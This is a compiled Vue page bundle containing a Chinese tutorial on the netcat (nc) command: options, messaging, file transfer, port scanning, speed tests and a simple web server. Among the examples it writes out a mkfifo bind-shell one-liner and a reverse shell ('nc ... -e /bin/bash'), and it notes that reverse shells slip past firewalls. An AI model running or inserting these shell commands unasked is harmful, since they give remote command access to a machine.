import{_ as a,V as n,W as s,a0 as e}from"./framework-8e76daeb.js";const l={},i=e(`<h2 id="命令简介" tabindex="-1"><a class="header-anchor" href="#命令简介" aria-hidden="true">#</a> 命令简介</h2><p>nc（netcat）是一个短小精悍、功能实用、简单可靠的网络工具，主要有如下作用： （1）端口侦听，nc 可以作为 server 以 TCP 或 UDP 方式侦听指定端口； （2）端口扫描，nc 可以作为 client 发起 TCP 或 UDP 请求； （3）机器之间传输文件； （4）机器之间网络测速。</p><p>nc 实际上是 ncat 的软链接。ncat 是为 Nmap(Network Mapper) 项目编写的，是 Nmap 套件中的一员，它旨在成为可靠的后端工具，可立即为其他应用程序和用户提供网络连接。ncat 不仅可以使用 IPv4 和 IPv6，还可以为用户提供几乎无限的潜在用途。</p><h2 id="命令格式" tabindex="-1"><a class="header-anchor" href="#命令格式" aria-hidden="true">#</a> 命令格式</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token punctuation">[</span>-46DdhklnrStUuvzC<span class="token punctuation">]</span> <span class="token punctuation">[</span>-i interval<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p source_port<span class="token punctuation">]</span> <span class="token punctuation">[</span>-s source_ip_address<span class="token punctuation">]</span> <span class="token punctuation">[</span>-T ToS<span class="token punctuation">]</span> <span class="token punctuation">[</span>-w timeout<span class="token punctuation">]</span> <span class="token punctuation">[</span>-X proxy_protocol<span class="token punctuation">]</span> <span class="token punctuation">[</span>-x proxy_address<span class="token punctuation">[</span>:port<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>hostname<span class="token punctuation">]</span> <span class="token punctuation">[</span>port<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="参数说明" tabindex="-1"><a class="header-anchor" href="#参数说明" aria-hidden="true">#</a> 参数说明</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>-4/6
  强制只使用 IPv4/IPv6 地址
-D
  在套接字上启用调试
-d
  不从 stdin 读取
-h
  打印出帮助信息
-k
  强制 nc 在当前连接完成后继续侦听另一个连接。注意如果不使用 -l 选项，则使用此选项是错误的
-l
  指定 nc 应该侦听传入的连接，而不是启动到远程主机的连接。将此选项与 -p、-s 或 -z 选项结合使用是错误的。此外，使用 -w 选项指定的超时将被忽略
-n
  不要在任何指定的地址、主机名或端口上执行任何 DNS 或服务查找
-r
  随机选择源端口和目标端口，而不是按照系统分配的顺序或范围内的顺序选择它们
-S
  启用 RFC 2385 TCP MD5 签名选项
-t
  使 nc 发送 RFC 854 DON&#39;T 和 WON&#39;T 响应 RFC 854 的 DO 和 WILL 请求。这使得使用 nc 编写 telnet 会话脚本成为可能
-U
  指定使用 Unix 域套接字
-u
  使用 UDP 代替默认选项 TCP
-v
  显示命令执行过程
-z
  表示 zero，只扫描侦听守护进程，而不向它们发送任何数据。此选项与 -l 选项结合使用是错误的
-C
  发送 CRLF 作为换行符
-i interval
  指定发送和接收的文本之间的延迟时间间隔。还可指定连接到多个端口之间的延迟时间
-p source_port
  指定 nc 应使用的源端口，但须受特权限制和可用性限制。将此选项与 -l 选项结合使用是错误的
-s source_ip_address
  设置本地主机送出数据包的 IP 地址。注意将此选项与 -l 选项结合使用是错误的
-T ToS
  指定连接的 IP 服务类型(TOS)。有效值是标记 &#39;&#39;lowdelay&#39;&#39;, &#39;&#39;throughput&#39;&#39;, &#39;&#39;reliability&#39;&#39;，或以 0x 开头的 8 位十六进制值
-w timeout
  如果连接和 stdin 空闲超过指定秒数，则连接将被关闭。-w 标志对 -l 选项没有影响。缺省不超时
-X proxy_protocol
  请求 nc 在与代理服务器对话时使用指定的协议。支持的协议是 “4”(SOCKsv.4)、“5”(SOCKV.5) 和 “connect”(HTTPS proxy)。如果未指定协议，则使用 SOCKS v.5
-x proxy_address[:port]
  使用指定代理服务器地址和端口连接到主机。如果未指定端口，则使用代理协议的已知端口（SOCKS为1080，HTTPS为3128）
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>nc 的控制参数不少，常用的几个参数如下所列</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>-l
  指定 nc 将处于侦听模式。指定该参数，则意味着 nc 被当作 server，侦听并接受连接，而非向其它地址发起连接
-p PORT
  指定 nc 使用的源端口
-s
  指定发送数据的源 IP 地址，适用于多网卡机器
-u
  指定 nc 使用 UDP 协议，默认为 TCP
-v
  输出交互或出错信息，新手调试时尤为有用
-w
  超时秒数，后面跟数字
-z
  表示 zero，扫描时不发送任何数据
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="常用示例" tabindex="-1"><a class="header-anchor" href="#常用示例" aria-hidden="true">#</a> 常用示例</h2><h3 id="相互发消息-c-s-模型" tabindex="-1"><a class="header-anchor" href="#相互发消息-c-s-模型" aria-hidden="true">#</a> 相互发消息(C/S 模型)</h3><p>用 nc 能够非常简单地建立一个基本的 C/S 模型。 打开控制台，在某个端口上启动 nc 监听，等待连接。例如，nc 在端口 1234 上启动监听，等待连接：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 可以认为是服务器端</span>
<span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10001</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在另外一个控制台上（或另外一台机器上），连接该机器上监听的端口</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 可以认为是客户端</span>
<span class="token function">nc</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>现在，端口之间的连接就建立了。连接建立之后，nc 并不区分谁是 server，谁是 client。 Linux 中的 nc 没有-c 或-e 选项（可能是安全因素），但是，你仍然能够通过重定向文件描述符在建立连接之后执行命令。注意，打开一个端口，让任何人连接并在你的机器上执行任意命令是危险的。如果你需要这样做，下面有个例子：</p><p>在 server 端:</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">mkfifo</span> /tmp/f
<span class="token function">cat</span> /tmp/f <span class="token operator">|</span> /bin/sh <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10001</span> <span class="token operator">&gt;</span> /tmp/f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在 client 端:</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span>
<span class="token punctuation">(</span>shell prompt from host.example.com<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>通过创建一个 FIFO 文件/tmp/f，让 nc 在 server 端 127.0.0.1 的端口 1234 上监听，当一个 client 成功连接之后，/bin/sh 在服务端执行，但执行反馈传送给 client 端。 当连接中断后，nc 也退出。如果要保持连接，使用-k 选项，但是如果命令退出，这个选项也不会重启它或保持 nc 运行。如果不再需要，不要忘记删除该文件描述符。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果发送失败，可以杀掉相关进程然后重新连接。使用<code>kill -9 $(lsof -i:10001 -t)</code></p><h3 id="文件传输" tabindex="-1"><a class="header-anchor" href="#文件传输" aria-hidden="true">#</a> 文件传输</h3><p>上面的例子可以扩展来建立一个基本的数据传输模型。在连接的一端输入的任何信息将输出到另一端，输入和输出能够很容易被捕捉来模拟文件传输。 nc 在一个端口上启动监听，并将输出重定向到一个文件中，当文件传输完毕后，连接自动关闭。</p><ul><li>从 Server 到 Client Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10001</span> <span class="token operator">&gt;</span> filename.out
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在另一台机器上，连接 nc 运行的机器和监听端口，将要传输的文件作为输入：</p><p>Client</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span> <span class="token operator">&lt;</span> filename.in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>从 Client 到 Server</li></ul><p>Server</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10001</span> <span class="token operator">&lt;</span> filename.in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Client</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span> <span class="token operator">&gt;</span> filename.out
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="端口扫描" tabindex="-1"><a class="header-anchor" href="#端口扫描" aria-hidden="true">#</a> 端口扫描</h3><p>端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-z</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-n</span> <span class="token number">110.40</span>.137.191 <span class="token number">21</span>-25 <span class="token number">5432</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可以运行在 TCP 或者 UDP 模式，默认是 TCP，-u 参数调整为 udp. z 参数告诉 netcat 使用 0 IO,连接成功后立即关闭连接， 不进行数据交换. v 参数指详细输出. n 参数告诉 netcat 不要使用 DNS 反向查询 IP 地址的域名. 以上命令会打印 21 到 25 和 5432 所有开放的端口</p><p>只希望将开放端口的行打印出来，可以用 grep</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-z</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-n</span> <span class="token number">110.40</span>.137.191 <span class="token number">21</span>-25 <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span><span class="token function">grep</span> succeeded
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="目录传输" tabindex="-1"><a class="header-anchor" href="#目录传输" aria-hidden="true">#</a> 目录传输</h3><p>发送一个文件很简单，但是如果我们想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具 tar，压缩后发送压缩包。</p><ul><li>从 Server 到 Client</li><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">tar</span> <span class="token parameter variable">-czvf</span> – testdir <span class="token operator">|</span> <span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10001</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在另一台机器上，连接 nc 运行的机器和监听端口，将要传输的文件作为输入：</p><ul><li>Client</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span> <span class="token operator">|</span> <span class="token function">tar</span> <span class="token parameter variable">-xvf</span> -
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这里在 Server 上，我们创建一个 tar 归档包并且通过-在控制台重定向它，然后使用管道，重定向给 netcat，netcat 可以通过网络发送它。 在客户端我们下载该压缩包通过 netcat 管道然后打开文件。 如果想要节省带宽传输压缩包，我们可以使用 bzip2 或者其他工具压缩</p><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">tar</span> <span class="token parameter variable">-czvf</span> – testdir <span class="token operator">|</span> <span class="token function">bzip2</span> <span class="token parameter variable">-z</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10001</span>
通过bzip2压缩
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>Client</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span> <span class="token operator">|</span> <span class="token function">bzip2</span> <span class="token parameter variable">-d</span> <span class="token operator">|</span><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> -
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="测试网速" tabindex="-1"><a class="header-anchor" href="#测试网速" aria-hidden="true">#</a> 测试网速</h3><p>测试网速其实利用了传输文件的原理，就是把来自一台机器的 /dev/zero 发送给另一台机器的 /dev/null 就是把一台机器的无限个 0，传输给另一个机器的空设备上，然后新开一个窗口使用 dstat 命令监测网速 在这之前需要保证机器先安装 dstat 工具。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> dstat
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>第 1 步，在 A 机器先启动接收数据的命令，监听自己的 8888 端口，把来自这个端口的数据都输出给空设备（这样不写磁盘，测试网速更准确）。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10001</span> <span class="token operator">&gt;</span> /dev/null
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>第 2 步，在 B 机器发送数据，把无限个 0 发送给 A 机器的 8888 端口。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span> <span class="token operator">&lt;</span> /dev/zero
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果是在同一台机器发送数据，即：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">10001</span> <span class="token operator">&lt;</span> /dev/zero
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>那么 receiver 将无法收到数据</p><h3 id="加密你通过网络发送的数据" tabindex="-1"><a class="header-anchor" href="#加密你通过网络发送的数据" aria-hidden="true">#</a> 加密你通过网络发送的数据</h3><p>如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如 mcrypt 的工具加密。</p><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> localhost <span class="token number">20000</span> <span class="token operator">|</span> mcrypt –flush –bare <span class="token parameter variable">-F</span> <span class="token parameter variable">-q</span> <span class="token parameter variable">-d</span> <span class="token parameter variable">-m</span> ecb <span class="token operator">&gt;</span> file.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>使用 mcrypt 工具加密数据。</p><ul><li>Client</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>mcrypt –flush –bare <span class="token parameter variable">-F</span> <span class="token parameter variable">-q</span> <span class="token parameter variable">-m</span> ecb <span class="token operator">&lt;</span> file.txt <span class="token operator">|</span> <span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">20000</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>使用 mcrypt 工具解密数据。 以上两个命令会提示需要密码，确保两端使用相同的密码。 这里我们是使用 mcrypt 用来加密，使用其它任意加密工具都可以。</p><h3 id="打开一个-shell" tabindex="-1"><a class="header-anchor" href="#打开一个-shell" aria-hidden="true">#</a> 打开一个 shell</h3><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/f <span class="token operator">&amp;&amp;</span> <span class="token function">mkfifo</span> /tmp/f
<span class="token function">cat</span> /tmp/f <span class="token operator">|</span> /bin/sh <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10001</span> <span class="token operator">&gt;</span> /tmp/f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>这里我们创建了一个 fifo 文件，然后使用管道命令把这个 fifo 文件内容定向到 shell 2&gt;&amp;1 中。是用来重定向标准错误输出和标准输出，然后管道到 netcat 运行的端口 20000 上。至此，我们已经把 netcat 的输出重定向到 fifo 文件中。</p><ul><li><p>说明： 从网络收到的输入写到 fifo 文件中 cat 命令读取 fifo 文件并且其内容发送给 sh 命令 sh 命令进程受到输入并把它写回到 netcat。 netcat 通过网络发送输出到 client 至于为什么会成功是因为管道使命令平行执行，fifo 文件用来替代正常文件，因为 fifo 使读取等待而如果是一个普通文件，cat 命令会尽快结束并开始读取空文件。 在客户端仅仅简单连接到服务器</p></li><li><p>Client</p></li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span>
<span class="token punctuation">(</span>shell prompt from host.example.com<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>你会得到一个 shell 提示符在客户端</p><h3 id="反向-shell" tabindex="-1"><a class="header-anchor" href="#反向-shell" aria-hidden="true">#</a> 反向 shell</h3><p>反向 shell 又称反弹 shell，是指在客户端打开的 shell。反向 shell 这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。</p><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10001</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在客户端，简单地告诉 netcat 在连接完成后，执行 shell。</p><ul><li>Client</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span> <span class="token parameter variable">-e</span> /bin/bash
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>现在，什么是反向 shell 的特别之处呢 反向 shell 经常被用来绕过防火墙的限制，如阻止入站连接。例如，我有一个专用 IP 地址为 192.168.10.1，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如 1.2.3.4 的 shell，那么我会用反向外壳用于这一目的。</p><h3 id="指定源端口" tabindex="-1"><a class="header-anchor" href="#指定源端口" aria-hidden="true">#</a> 指定源端口</h3><p>假设你的防火墙过滤除 25 端口外其它所有端口，你需要使用-p 选项指定源端口。</p><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10001</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Client</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span> <span class="token number">25</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>使用 1024 以内的端口需要 root 权限。 该命令将在客户端开启 25 端口用于通讯，否则将使用随机端口。</p><h3 id="指定源地址" tabindex="-1"><a class="header-anchor" href="#指定源地址" aria-hidden="true">#</a> 指定源地址</h3><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-u</span> <span class="token parameter variable">-l</span> <span class="token number">20000</span> <span class="token operator">&lt;</span> file.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Client</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-u</span> <span class="token number">110.40</span>.137.191 <span class="token number">10001</span> <span class="token parameter variable">-s</span> <span class="token number">172.31</span>.100.5 <span class="token operator">&gt;</span> file.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="静态-web-页面服务器" tabindex="-1"><a class="header-anchor" href="#静态-web-页面服务器" aria-hidden="true">#</a> 静态 web 页面服务器</h3><p>新建一个网页,命名为 somepage.html; 新建一个 shell script:</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
    <span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">80</span> <span class="token parameter variable">-q</span> <span class="token number">1</span> <span class="token operator">&lt;</span> somepage.html<span class="token punctuation">;</span>
<span class="token keyword">done</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>用 root 权限执行，然后在浏览器中输入 127.0.0.1 打开看看是否正确运行。 nc 指令通常都是给管理者进行除错或测试等动作用的，所以如果只是单纯需要临时的网页伺服器，使用 Python 的 SimpleHTTPServer 模组会比较方便。</p><h3 id="netcat-支持-ipv6" tabindex="-1"><a class="header-anchor" href="#netcat-支持-ipv6" aria-hidden="true">#</a> Netcat 支持 IPv6</h3><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-4</span> <span class="token parameter variable">-l</span> <span class="token number">2389</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Client</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-4</span> localhost <span class="token number">2389</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后我们可以使用 netstat 命令来查看网络的情况。</p><p>接下来我们看看 IPv6 的情况：</p><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code> <span class="token function">nc</span> <span class="token parameter variable">-6</span> <span class="token parameter variable">-l</span> <span class="token number">2389</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Client</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-6</span> localhost <span class="token number">2389</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="禁止从标准输入中读取数据" tabindex="-1"><a class="header-anchor" href="#禁止从标准输入中读取数据" aria-hidden="true">#</a> 禁止从标准输入中读取数据</h3><p>该功能使用 -d 参数，请看下面例子：</p><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">2389</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Client</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-d</span> localhost <span class="token number">2389</span>
Hi
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>你输入的 Hi 文本并不会送到服务器端。</p><h3 id="强制-netcat-服务器端保持启动状态" tabindex="-1"><a class="header-anchor" href="#强制-netcat-服务器端保持启动状态" aria-hidden="true">#</a> 强制 Netcat 服务器端保持启动状态</h3><p>如果连接到服务器的客户端断开连接，那么服务器端也会跟着退出。</p><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>$ <span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">2389</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Client</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>$ <span class="token function">nc</span> localhost <span class="token number">2389</span>
^C
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>上述例子中，但客户端断开时服务器端也立即退出。 我们可以通过 -k 参数来控制让服务器不会因为客户端的断开连接而退出。</p><ul><li>Server</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>$ <span class="token function">nc</span> <span class="token parameter variable">-k</span> <span class="token parameter variable">-l</span> <span class="token number">2389</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Client</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>$ <span class="token function">nc</span> localhost <span class="token number">2389</span>
^C
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,131),r=[i];function p(c,t){return n(),s("div",null,r)}const o=a(l,[["render",p],["__file","linux_command_nc.html.vue"]]);export{o as default};
